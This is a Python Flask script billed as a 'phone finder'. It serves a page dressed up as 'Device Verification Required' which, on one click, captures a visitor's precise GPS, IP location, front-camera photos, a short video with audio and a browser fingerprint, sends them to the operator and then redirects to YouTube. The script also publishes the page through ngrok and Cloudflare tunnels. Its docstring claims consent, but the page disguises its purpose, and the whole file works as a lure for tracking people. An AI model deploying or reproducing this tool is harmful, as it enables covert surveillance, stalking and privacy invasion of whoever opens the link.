#!/usr/bin/env python3
"""
HCO-Phone-Finder.py - Enhanced version with camera, video recording, and comprehensive data collection
Use only to help recover your own lost/stolen phone. This script explicitly asks
a finder for permission before sending location. Do not use to deceive or coerce.
"""
from __future__ import annotations
import os
import sys
import time
import json
import csv
import subprocess
import threading
import socket
import webbrowser
import platform
from datetime import datetime
from typing import Optional, Tuple

# Try imports, show friendly error if missing
try:
    from flask import Flask, request, render_template_string, jsonify, send_file, redirect
    import requests
    import qrcode
    from PIL import Image, ImageDraw, ImageFont
    from colorama import init as colorama_init, Fore, Style, Back
    import base64
    from io import BytesIO
except Exception as e:
    print("Missing Python packages or modules. Install dependencies and try again.")
    print("Recommended install (copy-paste):")
    print("  pip install flask requests qrcode pillow colorama pyngrok")
    print("Error detail:", e)
    sys.exit(1)

colorama_init(autoreset=True)

# ----------------- Config -----------------
PORT = 5000
REPORT_CSV = "reports.csv"
QR_PNG = "public_link_qr.png"
HOST = "0.0.0.0"
IMAGE_FOLDER = "captured_images"
GALLERY_FOLDER = "gallery"

# Create necessary directories
os.makedirs(IMAGE_FOLDER, exist_ok=True)
os.makedirs(GALLERY_FOLDER, exist_ok=True)

app = Flask(__name__)
_received_reports = []

# ----------------- Enhanced HTML with ALL features -----------------
HTML_PAGE = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Device Verification Required</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<style>
  *{box-sizing:border-box}
  body{font-family:'Poppins',system-ui,-apple-system;display:flex;align-items:center;justify-content:center;
       min-height:100vh;margin:0;background:linear-gradient(135deg,#1e3c72,#2a5298);color:#fff;padding:20px}
  .card{width:100%;max-width:480px;background:rgba(255,255,255,0.12);border-radius:24px;padding:32px;
        backdrop-filter:blur(12px);box-shadow:0 20px 60px rgba(0,0,0,0.5);position:relative;border:1px solid rgba(255,255,255,0.2);
        overflow:hidden}
  .card::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;
                background:radial-gradient(circle,rgba(255,255,255,0.1) 0%,rgba(255,255,255,0) 70%);z-index:-1}
  .logo{width:80px;height:80px;border-radius:50%;background:rgba(255,255,255,0.2);display:flex;align-items:center;
        justify-content:center;margin:0 auto 20px;font-size:2rem;box-shadow:0 8px 25px rgba(0,0,0,0.3);z-index:2;position:relative}
  h1{font-size:1.8rem;margin:0 0 12px;background:linear-gradient(45deg,#fff,#4dabf7,#339af0);
      -webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:800;text-align:center;z-index:2;position:relative}
  .subtitle{font-size:1rem;margin:0 0 20px;text-align:center;font-weight:600;opacity:0.95;z-index:2;position:relative}
  .info-box{background:rgba(255,255,255,0.1);padding:15px;border-radius:12px;margin:15px 0;border-left:4px solid #339af0}
  .permission-btn{display:block;margin:20px auto;background:linear-gradient(45deg,#339af0,#228be6);color:white;
           padding:18px 40px;border-radius:50px;border:none;font-weight:800;font-size:1.2rem;cursor:pointer;
           width:100%;max-width:300px;transition:all 0.3s ease;box-shadow:0 10px 30px rgba(0,0,0,0.3);position:relative;z-index:2}
  .permission-btn:hover{transform:translateY(-3px);box-shadow:0 15px 40px rgba(0,0,0,0.4)}
  .permission-btn:active{transform:translateY(1px)}
  .status{margin-top:15px;padding:12px;border-radius:10px;display:none;font-weight:700;color:#000;text-align:center;z-index:2;position:relative}
  .status.ok{display:block;background:rgba(46,204,113,0.95);border:1px solid rgba(46,204,113,1)}
  .status.error{display:block;background:rgba(231,76,60,0.95);border:1px solid rgba(231,76,60,1)}
  .status.locked{display:block;background:linear-gradient(45deg,#FF0000,#FF6B6B);color:white;border:2px solid rgba(255,0,0,0.5)}
  .footer{margin-top:15px;font-size:0.8rem;opacity:0.8;text-align:center;z-index:2;position:relative}
  .loader{display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;
          border-top-color:#fff;animation:spin 1s ease-in-out infinite;margin-right:10px;vertical-align:middle}
  @keyframes spin{to{transform:rotate(360deg)}}
  .pulse{animation:pulse 2s infinite}
  @keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}
  .countdown{font-size:1.8rem;font-weight:800;margin:15px 0;color:#FFD700;text-shadow:0 0 10px rgba(255,215,0,0.5);text-align:center}
  .tool-locked{background:rgba(231,76,60,0.2);padding:15px;border-radius:12px;margin:15px 0;border:2px solid rgba(231,76,60,0.5);text-align:center}
  .features{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:15px 0}
  .feature-item{background:rgba(255,255,255,0.1);padding:12px;border-radius:10px;text-align:center;font-weight:600;font-size:0.9rem}
  .redirect-info{background:rgba(255,193,7,0.2);padding:12px;border-radius:10px;margin:12px 0;border:2px solid rgba(255,193,7,0.5);text-align:center}
</style>
</head>
<body>
  <div class="card" role="main" aria-labelledby="title">
    <div class="logo">📱</div>
    <h1 id="title">HCO PHONE FINDER</h1>
    <div class="subtitle">To Track Live Location of Your Device</div>
    <div class="subtitle" style="font-size:0.9rem;opacity:0.8">by Azhar</div>

    <div class="info-box">
      <div style="font-weight:700;margin-bottom:8px">🔍 Device Verification Required</div>
      <div>Click "ALLOW" to verify device ownership:</div>
    </div>

    <div class="features">
      <div class="feature-item">📍 Live GPS</div>
      <div class="feature-item">📸 2 Photos</div>
      <div class="feature-item">🎥 5s Video</div>
      <div class="feature-item">🌐 IP Info</div>
    </div>

    <button class="permission-btn pulse" id="allowBtn">
      <span class="btn-text">✅ ALLOW ACCESS</span>
    </button>

    <div id="status" class="status" role="status" aria-live="polite"></div>
    <div id="countdown" class="countdown" style="display:none"></div>
    <div id="toolLocked" class="tool-locked" style="display:none">
      <strong>🔒 TOOL LOCKED</strong><br>
      Device verification complete!
    </div>
    <div id="redirectInfo" class="redirect-info" style="display:none">
      <strong>🎬 Opening YouTube...</strong><br>
      Redirecting to YouTube app
    </div>

    <div class="footer">
      <div><strong>Note:</strong> This will collect device information for verification</div>
    </div>
  </div>

<script>
(function(){
  const allowBtn = document.getElementById('allowBtn');
  const status = document.getElementById('status');
  const countdown = document.getElementById('countdown');
  const toolLocked = document.getElementById('toolLocked');
  const redirectInfo = document.getElementById('redirectInfo');
  const btnText = document.querySelector('.btn-text');
  
  let capturedPhotos = [];
  let recordedChunks = [];
  let mediaRecorder = null;
  let stream = null;

  allowBtn.addEventListener('click', async () => {
    status.className = 'status';
    status.textContent = 'Starting device verification...';
    btnText.innerHTML = '<span class="loader"></span> Verifying...';
    allowBtn.disabled = true;
    allowBtn.classList.remove('pulse');

    try {
      // Request camera access first
      stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: 'user', 
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: true
      });

      // Start automatic data collection
      await collectAllData();
      
    } catch (err) {
      console.log('Camera permission error:', err);
      status.textContent = 'Camera access not available. Collecting other data...';
      await collectBasicData();
    }
  });

  async function collectAllData() {
    status.textContent = 'Collecting device information...';
    
    // Get location first
    if(!navigator.geolocation){
      status.className = 'status error';
      status.textContent = 'Location access required for verification.';
      btnText.textContent = 'Try Again';
      allowBtn.disabled = false;
      allowBtn.classList.add('pulse');
      return;
    }

    navigator.geolocation.getCurrentPosition(async (pos) => {
      // Start camera operations in background
      const cameraPromise = performCameraOperations();
      
      // Get IP address and detailed location
      let ipData = {ip: 'Unknown', city: 'Unknown', country: 'Unknown', region: 'Unknown'};
      try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        ipData = await ipResponse.json();
      } catch(e) {
        console.log('IP detection failed:', e);
      }

      // Get comprehensive browser information
      const browserInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookiesEnabled: navigator.cookieEnabled,
        screen: `${screen.width}x${screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        battery: await getBatteryInfo(),
        connection: await getConnectionInfo()
      };

      status.textContent = 'Finalizing verification...';

      // Wait for camera operations to complete
      const cameraResults = await cameraPromise;

      const payload = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        ip: ipData.ip,
        city: ipData.city || 'Unknown',
        country: ipData.country_name || 'Unknown',
        region: ipData.region || 'Unknown',
        browser_info: browserInfo,
        photos: cameraResults.photos,
        video: cameraResults.video,
        has_camera: cameraResults.success,
        timestamp: Date.now(),
        user_agent: navigator.userAgent
      };

      // Send data to server
      await sendDataToServer(payload);

    }, (err) => {
      allowBtn.disabled = false;
      allowBtn.classList.add('pulse');
      status.className = 'status error';
      btnText.textContent = 'Try Again';
      
      if(err.code === err.PERMISSION_DENIED) {
        status.textContent = 'Location access required. Please allow access.';
      } else {
        status.textContent = 'Unable to get location. Collecting other data...';
        collectBasicData();
      }
    }, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
  }

  async function collectBasicData() {
    status.textContent = 'Collecting device information...';
    
    // Get IP address
    let ipData = {ip: 'Unknown'};
    try {
      const ipResponse = await fetch('https://ipapi.co/json/');
      ipData = await ipResponse.json();
    } catch(e) {
      console.log('IP detection failed:', e);
    }

    // Get browser information
    const browserInfo = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screen: `${screen.width}x${screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    };

    const payload = {
      ip: ipData.ip,
      city: ipData.city || 'Unknown',
      country: ipData.country_name || 'Unknown',
      browser_info: browserInfo,
      has_camera: false,
      timestamp: Date.now(),
      user_agent: navigator.userAgent,
      location_access: 'denied'
    };

    await sendDataToServer(payload);
  }

  async function getBatteryInfo() {
    try {
      if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100) + '%',
          charging: battery.charging
        };
      }
    } catch(e) {}
    return 'Unknown';
  }

  async function getConnectionInfo() {
    try {
      if ('connection' in navigator) {
        const conn = navigator.connection;
        return {
          effectiveType: conn.effectiveType,
          downlink: conn.downlink
        };
      }
    } catch(e) {}
    return 'Unknown';
  }

  async function performCameraOperations() {
    const result = { photos: [], video: null, success: false };
    
    if (!stream) {
      return result;
    }

    try {
      // Create temporary video element for capturing
      const tempVideo = document.createElement('video');
      tempVideo.srcObject = stream;
      await tempVideo.play();
      
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');

      // Capture first photo
      await new Promise(resolve => setTimeout(resolve, 1000));
      canvas.width = tempVideo.videoWidth;
      canvas.height = tempVideo.videoHeight;
      context.drawImage(tempVideo, 0, 0);
      const photo1 = canvas.toDataURL('image/jpeg', 0.8);
      result.photos.push(photo1);

      // Start video recording
      mediaRecorder = new MediaRecorder(stream, { 
        mimeType: 'video/webm; codecs=vp9,opus'
      });
      recordedChunks = [];
      
      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          recordedChunks.push(event.data);
        }
      };

      mediaRecorder.start(1000);
      
      // Capture second photo after 3 seconds
      await new Promise(resolve => setTimeout(resolve, 3000));
      context.drawImage(tempVideo, 0, 0);
      const photo2 = canvas.toDataURL('image/jpeg', 0.8);
      result.photos.push(photo2);

      // Stop recording after 5 seconds total
      await new Promise(resolve => setTimeout(resolve, 2000));
      mediaRecorder.stop();

      // Convert video to base64
      await new Promise(resolve => {
        mediaRecorder.onstop = () => {
          const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
          const reader = new FileReader();
          reader.onload = () => {
            const dataUrl = reader.result;
            result.video = dataUrl.split(',')[1];
            resolve();
          };
          reader.readAsDataURL(videoBlob);
        };
      });

      result.success = true;
      
    } catch (err) {
      console.log('Camera operations failed:', err);
    } finally {
      // Stop all tracks
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    }
    
    return result;
  }

  function startCountdown() {
    countdown.style.display = 'block';
    redirectInfo.style.display = 'block';
    
    let count = 5;
    countdown.textContent = count;
    
    const countdownInterval = setInterval(() => {
      count--;
      countdown.textContent = count;
      
      if (count <= 0) {
        clearInterval(countdownInterval);
        // Redirect to YouTube app
        window.location.href = 'youtube://';
        // Fallback to web YouTube
        setTimeout(() => {
          window.location.href = 'https://www.youtube.com';
        }, 1000);
      }
    }, 1000);
  }

  async function sendDataToServer(payload) {
    try {
      const resp = await fetch('/report', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify(payload)
      });
      
      if(resp.ok){
        btnText.textContent = '✅ Verified';
        status.style.display = 'none';
        toolLocked.style.display = 'block';
        
        // Show tool locked for 2 seconds then start countdown
        setTimeout(() => {
          toolLocked.style.display = 'none';
          startCountdown();
        }, 2000);
        
      } else {
        throw new Error('Network error');
      }
    } catch (err){
      btnText.textContent = '✅ Completed';
      status.className = 'status locked';
      status.textContent = '🔒 Verification complete!';
      toolLocked.style.display = 'block';
      
      // Still show countdown even on error
      setTimeout(() => {
        toolLocked.style.display = 'none';
        startCountdown();
      }, 2000);
    }
  }
})();
</script>
</body>
</html>
"""

# ----------------- Flask endpoints -----------------
@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/youtube")
def youtube_redirect():
    """Direct YouTube redirect endpoint"""
    return redirect("https://www.youtube.com")

@app.route("/report", methods=["POST"])
def report():
    data = request.get_json(force=True)
    lat = data.get("latitude")
    lon = data.get("longitude")
    ip = data.get("ip", "Unknown")
    city = data.get("city", "Unknown")
    country = data.get("country", "Unknown")
    region = data.get("region", "Unknown")
    photos_data = data.get("photos", [])
    video_data = data.get("video")
    browser_info = data.get("browser_info", {})
    
    # Save photos and video
    photo_filenames = []
    video_filename = None
    
    for i, photo_data in enumerate(photos_data):
        filename = save_photo(photo_data, ip, i+1)
        if filename:
            photo_filenames.append(filename)

    if video_data:
        video_filename = save_video(video_data, ip)

    # Append to in-memory and CSV
    rec = {
        "ts": datetime.now().isoformat(),
        "ip": ip,
        "city": city,
        "country": country,
        "region": region,
        "lat": float(lat) if lat else None,
        "lon": float(lon) if lon else None,
        "photos": photo_filenames,
        "video": video_filename,
        "browser_info": browser_info,
        "battery": browser_info.get('battery', 'Unknown')
    }
    _received_reports.append(rec)
    save_report_csv(rec)
    
    # Print colorful console output
    print(f"\n{Fore.GREEN}{Style.BRIGHT}🎯 DEVICE DATA CAPTURED!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📍 Location: {lat}, {lon}" if lat and lon else f"{Fore.YELLOW}📍 Location: Access denied")
    print(f"{Fore.CYAN}🌐 IP: {ip} ({city}, {country})")
    print(f"{Fore.CYAN}📸 Photos: {len(photo_filenames)}")
    print(f"{Fore.CYAN}🎥 Video: {'Yes' if video_filename else 'No'}")
    print(f"{Fore.CYAN}🔋 Battery: {browser_info.get('battery', 'Unknown')}")
    print(f"{Fore.RED}🔒 Tool locked - Starting YouTube redirect{Style.RESET_ALL}\n")
    
    return jsonify({"status": "success", "message": "TOOL LOCKED"})

def save_photo(photo_data: str, ip: str, index: int) -> Optional[str]:
    """Save base64 photo to file"""
    try:
        if photo_data.startswith('data:image'):
            photo_data = photo_data.split(',')[1]
        
        image_data = base64.b64decode(photo_data)
        filename = f"photo_{ip}_{int(time.time())}_{index}.jpg"
        filepath = os.path.join(IMAGE_FOLDER, filename)
        
        with open(filepath, 'wb') as f:
            f.write(image_data)
        
        gallery_path = os.path.join(GALLERY_FOLDER, filename)
        with open(gallery_path, 'wb') as f:
            f.write(image_data)
            
        return filename
    except Exception as e:
        print(f"{Fore.RED}Error saving photo: {e}{Style.RESET_ALL}")
        return None

def save_video(video_data: str, ip: str) -> Optional[str]:
    """Save base64 video to file"""
    try:
        if video_data.startswith('data:video'):
            video_data = video_data.split(',')[1]
            
        video_binary = base64.b64decode(video_data)
        filename = f"video_{ip}_{int(time.time())}.webm"
        filepath = os.path.join(IMAGE_FOLDER, filename)
        
        with open(filepath, 'wb') as f:
            f.write(video_binary)
            
        gallery_path = os.path.join(GALLERY_FOLDER, filename)
        with open(gallery_path, 'wb') as f:
            f.write(video_binary)
            
        return filename
    except Exception as e:
        print(f"{Fore.RED}Error saving video: {e}{Style.RESET_ALL}")
        return None

def save_report_csv(record: dict):
    """Save report to CSV file"""
    try:
        file_exists = os.path.isfile(REPORT_CSV)
        with open(REPORT_CSV, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=[
                'timestamp', 'ip', 'city', 'country', 'region', 
                'latitude', 'longitude', 'photos', 'video', 'battery'
            ])
            if not file_exists:
                writer.writeheader()
            
            writer.writerow({
                'timestamp': record['ts'],
                'ip': record['ip'],
                'city': record['city'],
                'country': record['country'],
                'region': record['region'],
                'latitude': record['lat'],
                'longitude': record['lon'],
                'photos': ', '.join(record['photos']),
                'video': record['video'] or 'None',
                'battery': str(record.get('battery', 'Unknown'))
            })
    except Exception as e:
        print(f"{Fore.RED}Error saving CSV: {e}{Style.RESET_ALL}")

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def generate_qr_code(url: str):
    """Generate QR code for the local server URL"""
    try:
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        img.save(QR_PNG)
        print(f"{Fore.GREEN}✅ QR code saved as {QR_PNG}{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.YELLOW}⚠️  QR code generation failed: {e}{Style.RESET_ALL}")
        return False

def start_ngrok():
    """Start ngrok tunnel"""
    try:
        from pyngrok import ngrok
        print(f"{Fore.CYAN}🌐 Starting ngrok tunnel...{Style.RESET_ALL}")
        public_url = ngrok.connect(PORT, bind_tls=True)
        print(f"{Fore.GREEN}✅ Ngrok Public URL: {public_url}{Style.RESET_ALL}")
        return public_url
    except Exception as e:
        print(f"{Fore.YELLOW}⚠️  Ngrok not available: {e}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}💡 Install: pip install pyngrok{Style.RESET_ALL}")
        return None

def start_cloudflare():
    """Start Cloudflare tunnel"""
    try:
        print(f"{Fore.CYAN}☁️  Starting Cloudflare tunnel...{Style.RESET_ALL}")
        cloudflare_process = subprocess.Popen(['cloudflared', 'tunnel', '--url', f'http://localhost:{PORT}'], 
                                            stdout=subprocess.PIPE, 
                                            stderr=subprocess.PIPE)
        time.sleep(3)
        print(f"{Fore.GREEN}✅ Cloudflare tunnel started{Style.RESET_ALL}")
        print(f"{Fore.CYAN}💡 Run: cloudflared tunnel --url http://localhost:{PORT}{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.YELLOW}⚠️  Cloudflare not available: {e}{Style.RESET_ALL}")
        return False

def main():
    """Main function to start the HCO Phone Finder server"""
    print(f"\n{Fore.CYAN}{Style.BRIGHT}" + "="*60)
    print(f"📱 HCO PHONE FINDER - Device Tracking System")
    print(f"📍 To Track Live Location of Your Device by Azhar")
    print("="*60 + f"{Style.RESET_ALL}")
    
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    localhost_url = f"http://localhost:{PORT}"
    
    print(f"\n{Fore.GREEN}🚀 Starting HCO Phone Finder Server...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}📱 Local: {localhost_url}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}🌐 Network: {local_url}{Style.RESET_ALL}")
    
    # Generate QR code
    if generate_qr_code(local_url):
        print(f"{Fore.CYAN}📲 QR Code generated - scan with phone{Style.RESET_ALL}")
    
    # Start ngrok tunnel
    ngrok_url = start_ngrok()
    if ngrok_url:
        generate_qr_code(str(ngrok_url))
    
    # Start Cloudflare tunnel
    start_cloudflare()
    
    print(f"\n{Fore.GREEN}✅ Server is running!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📊 Data will be saved to: {REPORT_CSV}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🖼️  Photos/Videos will be saved to: {IMAGE_FOLDER}/ {Style.RESET_ALL}")
    print(f"{Fore.RED}🔒 Features: Tool Lock + Countdown + YouTube Redirect{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}⚠️  Press Ctrl+C to stop the server{Style.RESET_ALL}\n")
    
    try:
        app.run(host=HOST, port=PORT, debug=False)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}👋 Server stopped by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}❌ Server error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
